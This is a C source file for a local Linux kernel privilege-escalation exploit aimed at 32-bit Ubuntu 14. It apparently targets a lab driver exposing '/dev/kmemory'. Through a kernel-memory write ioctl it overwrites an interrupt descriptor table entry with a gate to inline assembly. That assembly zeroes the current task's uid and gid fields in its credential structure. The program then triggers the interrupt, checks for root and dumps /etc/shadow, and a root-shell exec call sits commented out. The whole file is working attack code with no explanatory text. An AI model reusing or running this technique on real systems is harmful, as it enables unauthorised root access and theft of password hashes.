#define _GNU_SOURCE
#include <fcntl.h>
#include <stdio.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include <stdint.h>

#include "kmem_ioctl.h"

#define UBUNTU14_32 1
#define UBUNTU14_64 2

#ifndef SYSTEM
# define SYSTEM UBUNTU14_64
#endif

#if SYSTEM == UBUNTU14_32
# define IDT_ADDR 0xc1c7b000
//# define IDT_ADDR 0xc1c84000
# define THREAD_SIZE 0x2000
# define TASK_CRED_OFFSET 1020
#elif SYSTEM == UBUNTU14_64
# define THREAD_SIZE 0x4000
# define TASK_CRED_OFFSET 1536
#endif

static int THREAD_SIZE_MASK = ~(THREAD_SIZE - 1);

struct idtr {
	unsigned short limit;
	unsigned int base;
} __attribute__ ((packed));

struct idt {
	unsigned short off1;
	unsigned short sel;
	unsigned char none,flags;
	unsigned short off2;
} __attribute__ ((packed));

#define SET_IDT_GATE(idt,ring,s,addr)    \
	(idt).off1 = addr & 0xffff;      \
	(idt).off2 = addr >> 16;         \
	(idt).sel = s;                   \
	(idt).none = 0;                  \
	(idt).flags = 0x8E | (ring << 5);

void get_root_idt(void *task)
{
	int *cred = (int *) *((unsigned long *)(task + TASK_CRED_OFFSET));

        cred[0] = cred[1] = cred[2] = cred[3] = 0; /* set uids */
        cred[4] = cred[5] = cred[6] = cred[7] = 0; /* set gids */
}

void kcode(void);
void __kcode(void)
{
	asm(
	"kcode: \n"
	"cld \n"
	"pusha \n"
	"pushl %es \n"
	"pushl %ds \n"
	"movl %ss,%edx \n"
	"movl %edx,%es \n"
	"movl %edx,%ds \n");
	__asm__("movl %0 ,%%eax" ::"m"(THREAD_SIZE_MASK));
	asm(
	"andl %esp,%eax \n"
	"pushl (%eax) \n"
	"call get_root_idt \n"
	"addl $4, %esp \n"
	"popl %ds \n"
	"popl %es \n"
	"popa \n"
	"cli \n"
	"iret \n"
	);
}

static void fatal(char *msg)
{
        fprintf(stderr, "%s\n", msg);
        exit(1);
}

int cat(const char *fname)
{
	char buffer[4096];
	ssize_t nbytes;
	int ifd = open(fname, O_RDONLY);

	if (ifd < 0) {
		fprintf(stderr, "Can't open file %s\n", fname);
		perror("Error: ");
		return -1;
	}

	while ((nbytes = read(ifd, buffer, sizeof(buffer))) > 0) {
		if (write(1, buffer, nbytes) != nbytes)
			return -2;
	}

	return (nbytes < 0) ? -2 : 0;
}

int main(int argc, char *argv[])
{
	int fd, rc;
	struct idt *idt = (struct idt *) IDT_ADDR;

	fd = open("/dev/kmemory", O_RDONLY);
	if (fd < 0) {
		printf("Can't open /dev/kmemory\n");
		exit(1);
	}
	printf("open: fd %d\n", fd);

        struct idt idtvec;
	struct kmem_ioctl mem = {
                .rw = {
                        .buf   = (char *) &idtvec,
                        .ppos  = (unsigned long) &idt[0xdd],
                        .count = sizeof(struct idt)
                }
        };
	SET_IDT_GATE(idtvec, 3, 0x60, ((unsigned long) &kcode));
	rc = ioctl(fd, KMEM_IOCTL_WRITE, &mem);

	asm volatile ("int $0xdd");

        if (getuid() == 0) {
                printf("[+] Got root!\n");
        } else {
                fatal("[x] Failed to get root :(");
        }

        setresuid(0, 0, 0);
	cat("/etc/shadow");
        //execl("/bin/sh", "/bin/sh", "−i", NULL);
}
